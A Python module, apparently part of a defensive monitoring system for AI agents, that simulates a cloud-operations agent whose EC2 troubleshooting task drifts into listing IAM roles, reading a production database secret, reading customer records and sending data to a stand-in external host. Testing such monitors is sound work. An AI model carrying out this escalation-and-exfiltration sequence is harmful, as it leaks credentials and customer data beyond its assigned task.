from app.tools.cloud_tools import (
    check_ec2,
    read_cloudwatch,
    read_application_logs,
    list_iam_roles,
    get_secret,
    read_s3,
    send_external,
)
from app.tools.document_tools import fetch_document
from app.security.content_pipeline import inspect_content

class CloudOpsAgent:

    def __init__(self, agent_id: str, task: str):
        self.agent_id = agent_id
        self.task = task

    def run_normal_task(self):
        """
        Simulates a legitimate EC2 troubleshooting task.
        """

        actions = []

        actions.append(
            check_ec2("i-demo123")
        )

        actions.append(
            read_cloudwatch("i-demo123")
        )

        actions.append(
            read_application_logs("i-demo123")
        )

        return {
            "agent_id": self.agent_id,
            "task": self.task,
            "scenario": "normal",
            "actions": actions,
        }

    def run_attack_scenario(self):
        """
        Simulates a legitimate agent whose behavior becomes dangerous.
        """

        actions = []

        # Legitimate beginning
        actions.append(
            check_ec2("i-demo123")
        )

        actions.append(
            read_cloudwatch("i-demo123")
        )

        # Suspicious progression
        actions.append(
            list_iam_roles()
        )

        actions.append(
            get_secret("production-db-password")
        )

        actions.append(
            read_s3(
                "company-sensitive-data",
                "customer_records.csv"
            )
        )

        actions.append(
            send_external(
                "https://untrusted-example.test"
            )
        )

        return {
            "agent_id": self.agent_id,
            "task": self.task,
            "scenario": "attack",
            "actions": actions,
        }
    def read_document(self, filename: str):
        """
        Retrieve a document, inspect it through
        the NEXUS security pipeline, and only
        deliver safe content to the agent.
        """

        document = fetch_document(filename)

        if not document["success"]:

            return {
                "agent_id": self.agent_id,
                "task": self.task,
                "scenario": "document_reading",
                "document": document,
            }

        security_result = inspect_content(
            document["content"]
        )

        # -------------------------------------------------
        # BLOCK
        # -------------------------------------------------

        if security_result["final_decision"] == "BLOCK":

            return {
                "agent_id": self.agent_id,
                "task": self.task,
                "scenario": "document_reading",

                "document": {
                    "resource": document["resource"],
                },

                "security": security_result,

                "enforcement":
                    "QUARANTINE_DOCUMENT",

                "content_delivered_to_agent":
                    False,

                "content": None,
            }

        # -------------------------------------------------
        # HOLD
        # -------------------------------------------------

        if security_result["final_decision"] == "HOLD":

            return {
                "agent_id": self.agent_id,
                "task": self.task,
                "scenario": "document_reading",

                "document": {
                    "resource": document["resource"],
                },

                "security": security_result,

                "enforcement":
                    "HOLD_FOR_TIER_3",

                "content_delivered_to_agent":
                    False,

                "content": None,
            }

        # -------------------------------------------------
        # ALLOW
        # -------------------------------------------------

        return {
            "agent_id": self.agent_id,
            "task": self.task,
            "scenario": "document_reading",

            "document": {
                "resource": document["resource"],
            },

            "security": security_result,

            "enforcement":
                "ALLOW_DOCUMENT",

            "content_delivered_to_agent":
                True,

            "content": document["content"],
        }
    def get_normal_action_requests(self):
        """
        Return legitimate cloud actions as REQUESTS.

        Nothing is executed yet.
        """

        return [
            {
                "tool_name": "check_ec2",
                "service": "EC2",
                "action": "DescribeInstances",
                "capability": "ec2:DescribeInstances",
                "resource": "i-demo123",
                "arguments": {
                    "instance_id": "i-demo123"
                },
            },

            {
                "tool_name": "read_cloudwatch",
                "service": "CloudWatch",
                "action": "GetMetricData",
                "capability": "cloudwatch:GetMetricData",
                "resource": "i-demo123",
                "arguments": {
                    "instance_id": "i-demo123"
                },
            },

            {
                "tool_name": "read_application_logs",
                "service": "CloudWatch",
                "action": "GetLogEvents",
                "capability": "cloudwatch:GetLogEvents",
                "resource": "i-demo123",
                "arguments": {
                    "instance_id": "i-demo123"
                },
            },
        ]


    def get_attack_action_requests(self):
        """
        Return the suspicious scenario as REQUESTS.

        These requests have NOT executed yet.
        """

        return [
            {
                "tool_name": "check_ec2",
                "service": "EC2",
                "action": "DescribeInstances",
                "capability": "ec2:DescribeInstances",
                "resource": "i-demo123",
                "arguments": {
                    "instance_id": "i-demo123"
                },
            },

            {
                "tool_name": "read_cloudwatch",
                "service": "CloudWatch",
                "action": "GetMetricData",
                "capability": "cloudwatch:GetMetricData",
                "resource": "i-demo123",
                "arguments": {
                    "instance_id": "i-demo123"
                },
            },

            {
                "tool_name": "list_iam_roles",
                "service": "IAM",
                "action": "ListRoles",
                "capability": "iam:ListRoles",
                "resource": "aws-account",
                "arguments": {},
            },

            {
                "tool_name": "get_secret",
                "service": "SecretsManager",
                "action": "GetSecretValue",
                "capability": "secretsmanager:GetSecretValue",
                "resource": "production-db-password",
                "arguments": {
                    "secret_name":
                        "production-db-password"
                },
            },

            {
                "tool_name": "read_s3",
                "service": "S3",
                "action": "GetObject",
                "capability": "s3:GetObject",
                "resource": (
                    "company-sensitive-data/"
                    "customer_records.csv"
                ),
                "arguments": {
                    "bucket":
                        "company-sensitive-data",

                    "object_name":
                        "customer_records.csv",
                },
            },

            {
                "tool_name": "send_external",
                "service": "ExternalAPI",
                "action": "SendData",
                "capability": "external:SendData",
                "resource":
                    "https://untrusted-example.test",

                "arguments": {
                    "destination":
                        "https://untrusted-example.test"
                },
            },
        ]


    def get_safe_recovery_request(self):
        """
        A legitimate action used to prove that the agent
        can continue its approved task after containment.
        """

        return {
            "tool_name": "read_application_logs",
            "service": "CloudWatch",
            "action": "GetLogEvents",
            "capability": "cloudwatch:GetLogEvents",
            "resource": "i-demo123",
            "arguments": {
                "instance_id": "i-demo123"
            },
        }